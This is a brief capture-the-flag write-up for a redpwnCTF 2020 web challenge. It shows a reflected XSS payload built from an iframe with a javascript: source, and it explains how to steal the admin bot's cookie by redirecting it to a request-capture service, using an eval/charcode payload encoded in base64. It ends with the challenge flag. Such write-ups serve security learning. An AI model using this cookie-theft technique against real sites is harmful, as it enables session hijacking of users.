**Challenge:** https://static-static-hosting.2020.redpwnc.tf/

Reflected XSS Payload: `<iframe src="javascript:<JS code to receive the flag>"`

Test [`<iframe src="javascript:alert(document.domain)">`](https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+)

The flag will be the Admin's cookie. You only need to send a paylaod to Admin and make a redirect to your HTTP server with Admin's cookie.

Create an HTTP server or you can use some online solutions like https://webhook.site/ or https://requestbin.com/.

Use this [javascript code](https://gist.github.com/EffectRenan/9e85ddc199668e7b56decd88c875ef6e) to generate a payload which use `eval` function.
  - Edit the variable host with your URL.
  - Execute: `node eval-charcode.js | base64`. ***Ps: Base64 encode is necessary to exploit it.***


Final payload: `https://static-static-hosting.2020.redpwnc.tf/#<base64 encode generated>`

Send this URL to Admin at `https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting`

**Flag:** flag{wh0_n33d5_d0mpur1fy}
